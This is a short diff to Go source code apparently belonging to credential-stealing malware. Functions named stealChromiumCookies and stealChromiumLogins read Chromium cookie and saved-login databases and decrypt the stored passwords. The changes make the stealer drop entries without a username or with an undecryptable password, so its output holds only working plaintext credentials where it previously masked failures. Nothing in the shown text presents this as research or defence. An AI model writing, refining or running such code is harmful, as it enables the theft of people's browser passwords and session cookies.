@@ -171,7 +171,7 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 			dbPath = tmpPath
 			needCleanup = true
 		} else {
-			dbPath = "file:" + cookiePath + "?mode=ro&immutable=1"
+			dbPath = cookiePath
 		}
 
 		if needCleanup {
@@ -240,7 +240,7 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 			dbPath = tmpPath
 			needCleanup = true
 		} else {
-			dbPath = "file:" + loginPath + "?mode=ro&immutable=1"
+			dbPath = loginPath
 		}
 
 		if needCleanup {
@@ -268,9 +268,12 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 			if url == "" && username == "" {
 				continue
 			}
+			if username == "" {
+				continue
+			}
 			password := decryptCookieValue(encPassword, userDataPath)
 			if password == "" || password == "(encrypted)" {
-				password = "***"
+				continue
 			}
 			sb.WriteString(fmt.Sprintf("URL: %s\nLogin: %s\nPassword: %s\n\n", url, username, password))
 		}
